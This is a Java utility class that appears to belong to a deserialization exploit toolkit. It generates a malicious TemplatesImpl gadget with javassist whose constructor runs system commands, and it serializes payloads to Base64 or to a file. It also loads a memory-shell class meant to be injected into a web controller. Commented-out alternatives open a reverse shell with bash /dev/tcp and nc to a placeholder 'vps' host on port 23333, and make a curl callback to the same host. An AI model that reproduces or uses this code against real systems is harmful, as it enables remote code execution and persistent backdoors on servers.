package com.example;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;

import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;

public class Utils {
    public static String getTemplatesImplBase64() throws Exception{
        return new String(Base64.getEncoder().encode(GenerateEvil()));
    }

    public static byte[] GenerateEvil() throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("a");
        CtClass superClass = pool.get(AbstractTranslet.class.getName());
        ctClass.setSuperclass(superClass);
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, ctClass);
        constructor.setBody("Runtime.getRuntime().exec(\"calc\");");
//        constructor.setBody("Runtime.getRuntime().exec(\"bash -c $@|bash 0 echo bash -i >& /dev/tcp/vps/23333 0>&1\");");
//        constructor.setBody("Runtime.getRuntime().exec(\"nc vps 23333 -e /bin/sh\");");
//        constructor.setBody("Runtime.getRuntime().exec(\"curl vps:23333\");");
        ctClass.addConstructor(constructor);
        return ctClass.toBytecode();
    }

    public static void SetValue(Object obj, String name, Object value) throws Exception {
        Class clz = obj.getClass();
        Field nameField = clz.getDeclaredField(name);
        nameField.setAccessible(true);
        nameField.set(obj, value);
    }
    public static TemplatesImpl getTemplatesImpl() throws Exception{
        byte[][] bytes = new byte[][]{GenerateEvil()};
        TemplatesImpl templates = new TemplatesImpl();
        SetValue(templates, "_bytecodes", bytes);
        SetValue(templates, "_name", "0w0");
        SetValue(templates, "_tfactory", null);
        return templates;
    }
    public static String Serialize(Object o) throws Exception{
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(baos);
        objectOutputStream.writeObject(o);
        String str = new String(Base64.getEncoder().encode(baos.toByteArray()));
        return str;
    }
    public static void UnSerialize(String str) throws Exception{
        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(str)));
        objectInputStream.readObject();
    }
    public static String Base64_Encode(byte[] bytes) throws Exception{
        return new String(Base64.getEncoder().encode(bytes));
    }
    public static String Byte2Hex(byte[] bytes) throws Exception{
        StringBuilder builder = new StringBuilder();
        for(byte b: bytes){
            builder.append(String.format("%02X", b));
        }
        System.out.println(builder.toString());
        return builder.toString();
    }
    public static byte[] Hex2Byte(String hexString) {
        int len = hexString.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(hexString.charAt(i), 16) << 4)
                    + Character.digit(hexString.charAt(i+1), 16));
        }
        return data;
    }

    public static void Serbin(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static TemplatesImpl memTemplatesImpl() throws Exception{
        byte[][] bytes = new byte[][]{GenerateMemShell()};
        TemplatesImpl templates = new TemplatesImpl();
        SetValue(templates, "_bytecodes", bytes);
        SetValue(templates, "_name", "0w0");
        SetValue(templates, "_tfactory", new TransformerFactoryImpl());
        return templates;
    }

    private static byte[] GenerateMemShell() throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.getCtClass("com.example.InjectToController");
        return ctClass.toBytecode();
    }

    public static Field getField ( final Class<?> clazz, final String fieldName ) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            if ( field != null )
                field.setAccessible(true);
            else if ( clazz.getSuperclass() != null )
                field = getField(clazz.getSuperclass(), fieldName);

            return field;
        }
        catch ( NoSuchFieldException e ) {
            if ( !clazz.getSuperclass().equals(Object.class) ) {
                return getField(clazz.getSuperclass(), fieldName);
            }
            throw e;
        }
    }
    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }
}